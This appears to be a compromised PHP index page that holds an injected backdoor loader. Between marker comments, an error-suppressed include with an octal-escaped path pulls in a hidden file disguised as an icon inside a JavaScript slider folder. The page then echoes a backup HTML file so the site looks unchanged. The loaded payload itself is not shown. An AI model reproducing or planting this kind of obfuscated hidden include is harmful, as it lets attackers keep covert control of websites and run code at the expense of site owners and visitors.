<?php




/*79f60*/

@include "\057ho\155e/\154iv\145te\163tp\162oj\145ct\163/p\165bl\151c_\150tm\154/s\153ai\160he\162/j\163/m\165lt\151sc\162ol\154-s\154id\145r/\056fb\06527\066af\056ic\157";

/*79f60*/


echo @file_get_contents('index.html.bak.bak');